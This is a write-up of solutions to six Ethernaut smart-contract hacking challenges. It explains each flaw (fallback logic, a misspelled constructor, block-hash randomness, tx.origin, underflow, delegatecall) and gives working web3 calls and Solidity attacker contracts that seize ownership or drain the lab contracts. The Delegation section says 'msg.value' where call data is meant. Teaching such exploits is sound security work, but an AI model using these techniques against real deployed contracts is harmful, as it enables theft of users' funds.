# Ethernaut solution

## 1. Fallback
Abusing erroneous logic between the functions and fallback function
```
await contract.contribute({value: 1234});
await contract.sendTransaction({value: 1234});
await contract.withdraw();
```

## 2. Fallout
Constructor is spelled wrongly; becomes a regular function
```
await contract.Fal1out({value: 1234});
await contract.sendAllocation(await contract.owner());
```

## 3. Coinflip
Don't rely on block number for any validation logic. I can calculate solution if both our txn in the same block and pass the result to your contract!
``` 
pragma solidity ^0.4.24;
import "./CoinFlip.sol";

contract CoinFlipSoln {
    CoinFlip private _victim;
    uint256 private lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _address) public {
        _victim = CoinFlip(_address);
    }
    
    function hackIt() public {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    _victim.flip(side);

  }
}
```

## 4. Telephone
Don't rely on tx.origin. Remember that when you call a contract (B) function from within another contract (A), the msg.sender is the address of A, not the account that you initiated the function from. The only way you can preserve msg.sender is through DelegateCall but that's another shit show by itself! Would avoid unless you know what you're doing.
```
pragma solidity ^0.4.24;
import "./telephone.sol";

contract HackIt {
    Telephone private telephone;
    
    constructor(address _address) public {
        telephone = Telephone(_address);
    }
    
    function hackIt() public {
        telephone.changeOwner(msg.sender);
    }
}
```

## 5. Token
Be careful of integer over/underflow. Always use safemath libraries. Basically I understood that no matter what parameter I entered as _value, it will always return a number that is > 0 because it's a uint therefore the require statement is as good as useless. 
```
await contract.transfer(instance, 25)
```


## 6. Delegation
Be very very careful when using delegatecall. msg.sender, msg.data, msg.value are all preserved. Always do a check to ensure that msg.data.length == 0 if you don't want them to call any function. https://solidity.readthedocs.io/en/v0.4.25/types.html#address for more info. All I had to do was trigger the fallback function (note that it is not payable) with "pwn()" as the msg.value. https://web3js.readthedocs.io/en/1.0/web3-eth.html#eth-sendtransaction
```
await contract.sendTransaction({data: web3.sha3("pwn()").slice(0, 10)})
```





